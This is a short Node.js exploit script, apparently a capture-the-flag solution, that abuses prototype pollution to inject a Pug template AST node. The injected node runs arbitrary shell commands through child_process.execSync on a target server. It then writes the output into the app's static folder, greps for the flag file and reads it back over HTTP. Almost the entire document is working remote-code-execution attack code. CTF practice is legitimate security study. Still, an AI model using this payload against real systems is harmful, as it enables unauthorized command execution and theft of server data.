const axios = require('axios');

const pugModularExploit = async (command, fileName) => {
  let payload = {
    'artist.name': 'Haigh',
    'Object.__proto__.block': {
      type: 'Text',
      line: `process.mainModule.require('child_process').execSync('${command}')`,
    },
  };

  await axios.post('http://<IP>:<PORT>/api/submit', payload);
  let flagName = await axios.get(
    `http://<IP>:<PORT>/static/${fileName}`
  );
  return flagName.data;
};
(async () => {
  let flagName = await pugModularExploit(
    'ls | grep flag  > /app/static/check',
    'check'
  );

  let flag = await pugModularExploit(
    `cat ${flagName.trim()} > /app/static/flag`,
    'flag'
  );
  console.log(flag);
})();
